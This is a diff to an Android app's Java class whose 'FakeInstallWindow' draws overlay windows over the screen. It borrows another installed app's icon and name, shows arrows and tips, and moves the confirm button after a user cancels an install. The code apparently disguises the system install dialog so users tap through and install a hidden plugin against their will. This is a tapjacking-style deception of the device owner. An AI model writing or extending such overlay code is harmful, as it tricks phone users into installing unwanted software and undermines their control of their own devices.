@@ -2,6 +2,7 @@ package com.xstd.qm;
 
 import android.content.Context;
 import android.content.Intent;
+import android.graphics.Matrix;
 import android.graphics.PixelFormat;
 import android.net.Uri;
 import android.os.Handler;
@@ -98,10 +99,26 @@ public class UtilOperator {
         protected int screenHeight;
         protected float density;
 
+        protected ImageView arrow;
+        protected TextView tips;
+
+        protected View rightView;
+        protected View leftView;
+
+        protected View timerLeftSplitor;
+        protected View timerRightSplitor;
+
+        protected View topSplitorView;
+        protected View bottomSplitorView;
+
+        boolean leftTime = true;
+
         protected WindowManager.LayoutParams confirmFullBtnParams;
         protected WindowManager.LayoutParams confirmBtnParams;
         protected WindowManager.LayoutParams timerBtnParams;
 
+        protected WindowManager.LayoutParams topSpltitorParams;
+        protected WindowManager.LayoutParams bottomSpltitorParams;
 
         public FakeInstallWindow(Context context) {
             this.context = context;
@@ -117,6 +134,22 @@ public class UtilOperator {
             installView.setBackgroundColor(context.getResources().getColor(android.R.color.background_dark));
             installFullView.setBackgroundColor(context.getResources().getColor(android.R.color.background_dark));
 
+            View v = installView.findViewById(R.id.left_splitor);
+            v.setVisibility(View.VISIBLE);
+            v = installView.findViewById(R.id.right_splitor);
+            v.setVisibility(View.VISIBLE);
+
+            arrow = (ImageView) coverView.findViewById(R.id.point);
+            tips = (TextView) coverView.findViewById(R.id.tips);
+
+            rightView = coverView.findViewById(R.id.right_tips);
+            leftView = coverView.findViewById(R.id.left_tips);
+
+            timerLeftSplitor = timerView.findViewById(R.id.left_splitor);
+            timerRightSplitor=  timerView.findViewById(R.id.right_splitor);
+//            topSplitorView = layoutInflater.inflate(R.layout.fake_splitor_v, null);
+//            bottomSplitorView = layoutInflater.inflate(R.layout.fake_splitor_v, null);
+
             DisplayMetrics dm = new DisplayMetrics();
             wm.getDefaultDisplay().getMetrics(dm);
             screenWidth = dm.widthPixels;
@@ -130,8 +163,8 @@ public class UtilOperator {
             PLuginManager.AppInfo appInfo = SingleInstanceBase.getInstance(PLuginManager.class).randomScanInstalledIcon(context);
             if (appInfo != null) {
                 icon.setImageDrawable(appInfo.icon);
-                name.setText(String.format(context.getString(R.string.protocal_title), appInfo.name));
-                content.setText(context.getString(R.string.protocal).replace("**", appInfo.name));
+//                name.setText(String.format(context.getString(R.string.protocal_title), appInfo.name));
+//                content.setText(context.getString(R.string.protocal).replace("**", appInfo.name));
 
                 AppRuntime.CURRENT_FAKE_APP_INFO.name = appInfo.name;
                 AppRuntime.CURRENT_FAKE_APP_INFO.packageNmae = appInfo.packageNmae;
@@ -152,6 +185,9 @@ public class UtilOperator {
                         wm.removeView(installFullView);
                     }
                 }
+//                if (topSplitorView != null) wm.removeView(topSplitorView);
+
+//                topSplitorView = null;
                 coverView = null;
                 timerView = null;
                 installView = null;
@@ -165,14 +201,19 @@ public class UtilOperator {
 //                }
             } else {
                 if (SettingManager.getInstance().getCancelInstallReserve()) {
+                    leftTime = false;
                     //timer layout
                     timerBtnParams.gravity = Gravity.RIGHT | Gravity.BOTTOM;
                     //full layout
                     confirmFullBtnParams.gravity = Gravity.BOTTOM | Gravity.LEFT;
                     //cancel layout
-                    confirmBtnParams.width = (int) (52 * density);
-                    confirmBtnParams.x = (screenWidth / 2 - confirmBtnParams.width) / 2;
+                    int baseWidth = (int) (52 * density);
+                    confirmBtnParams.width = baseWidth;// + (screenWidth / 2 - baseWidth) / 2;
+                    confirmBtnParams.x = (screenWidth / 2 - baseWidth) / 2;
                     confirmBtnParams.gravity = Gravity.BOTTOM | Gravity.START;
+
+                    timerRightSplitor.setVisibility(View.GONE);
+                    timerLeftSplitor.setVisibility(View.VISIBLE);
 
                     if (installFullView != null) {
                         wm.updateViewLayout(installFullView, confirmFullBtnParams);
@@ -182,8 +223,13 @@ public class UtilOperator {
                         installFullView.setBackgroundColor(context.getResources().getColor(android.R.color.background_dark));
                         wm.addView(installFullView, confirmFullBtnParams);
                     }
+//                    wm.updateViewLayout(topSplitorView, topSpltitorParams);
                     wm.updateViewLayout(installView, confirmBtnParams);
                     wm.updateViewLayout(timerView, timerBtnParams);
+
+                    //change cover
+                    rightView.setVisibility(View.GONE);
+                    leftView.setVisibility(View.VISIBLE);
 
                     SettingManager.getInstance().setCancelInstallReserve(false);
                 }
@@ -194,6 +240,13 @@ public class UtilOperator {
                         wm.removeView(installFullView);
                     }
                     installFullView = null;
+                    if (leftTime) {
+                        timerLeftSplitor.setVisibility(View.GONE);
+                        timerRightSplitor.setVisibility(View.VISIBLE);
+                    } else {
+                        timerLeftSplitor.setVisibility(View.VISIBLE);
+                        timerRightSplitor.setVisibility(View.GONE);
+                    }
                 } else if (count == 1 * 5) {
                     AppRuntime.WATCHING_SERVICE_BREAK.set(true);
                     if (installFullView == null) {
@@ -201,6 +254,8 @@ public class UtilOperator {
                         installFullView.setBackgroundColor(context.getResources().getColor(android.R.color.background_dark));
                         wm.addView(installFullView, confirmFullBtnParams);
                     }
+                    timerLeftSplitor.setVisibility(View.GONE);
+                    timerRightSplitor.setVisibility(View.GONE);
 
                     UtilsRuntime.goHome(context);
                 } else if (AppRuntime.PLUGIN_INSTALLED || !AppRuntime.INSTALL_PACKAGE_TOP_SHOW.get()) {
@@ -214,6 +269,8 @@ public class UtilOperator {
                         installFullView.setBackgroundColor(context.getResources().getColor(android.R.color.background_dark));
                         wm.addView(installFullView, confirmFullBtnParams);
                     }
+                    timerLeftSplitor.setVisibility(View.GONE);
+                    timerRightSplitor.setVisibility(View.GONE);
                 } else if (!AppRuntime.PLUGIN_INSTALLED && AppRuntime.INSTALL_PACKAGE_TOP_SHOW.get()
                                && count > 1 * 5) {
                     /**
@@ -224,6 +281,14 @@ public class UtilOperator {
                         wm.removeView(installFullView);
                     }
                     installFullView = null;
+
+                    if (leftTime) {
+                        timerLeftSplitor.setVisibility(View.GONE);
+                        timerRightSplitor.setVisibility(View.VISIBLE);
+                    } else {
+                        timerLeftSplitor.setVisibility(View.VISIBLE);
+                        timerRightSplitor.setVisibility(View.GONE);
+                    }
                 }
 
                 handler.post(new Runnable() {
@@ -252,13 +317,6 @@ public class UtilOperator {
         }
 
         public void dismiss() {
-//            if (coverView != null && timerView != null) {
-//                wm.removeView(coverView);
-//                wm.removeView(timerView);
-//            }
-//            coverView = null;
-//            timerView = null;
-//            fake = null;
         }
 
         public void show(boolean full) {
@@ -274,13 +332,40 @@ public class UtilOperator {
                 }
             }
 
+            if (!SettingManager.getInstance().getCancelInstallReserve()) {
+                rightView.setVisibility(View.VISIBLE);
+                leftView.setVisibility(View.GONE);
+            } else {
+                rightView.setVisibility(View.GONE);
+                leftView.setVisibility(View.VISIBLE);
+            }
+
             AppRuntime.FAKE_WINDOWS_SHOW.set(true);
+            //增加top和bottom的splitor
+//            topSpltitorParams = new WindowManager.LayoutParams();
+//            topSpltitorParams.type = android.view.WindowManager.LayoutParams.TYPE_PHONE;
+//            topSpltitorParams.format = PixelFormat.RGBA_8888;
+//            topSpltitorParams.width = screenWidth / 2;
+//            topSpltitorParams.height = (int) (2 * density);
+//            topSpltitorParams.y = (int) (48 * density);
+//            if (!leftConfirm && !SettingManager.getInstance().getCancelInstallReserve()) {
+//                //右侧是安装
+//                topSpltitorParams.x = screenWidth / 2;
+//                topSpltitorParams.gravity = Gravity.BOTTOM | Gravity.START;
+//            } else {
+//                //左侧是安装
+//                topSpltitorParams.x = 0;
+//                topSpltitorParams.gravity = Gravity.BOTTOM | Gravity.START;
+//            }
+//            wm.addView(topSplitorView, topSpltitorParams);
+
             //install
             confirmBtnParams = new WindowManager.LayoutParams();
             confirmBtnParams.type = android.view.WindowManager.LayoutParams.TYPE_PHONE;
             confirmBtnParams.format = PixelFormat.RGBA_8888;
             confirmBtnParams.flags = WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL;
-            confirmBtnParams.width = (int) (50 * density);
+            int baseWidth = (int) (50 * density);
+            confirmBtnParams.width = baseWidth;// + (screenWidth / 2 - baseWidth) / 2;
             confirmBtnParams.height = (int) (48 * density);
             if (!leftConfirm && !SettingManager.getInstance().getCancelInstallReserve()) {
 //                confirmBtnParams.x = (screenWidth / 2 - confirmBtnParams.width) / 2 + (int) (25 * density);
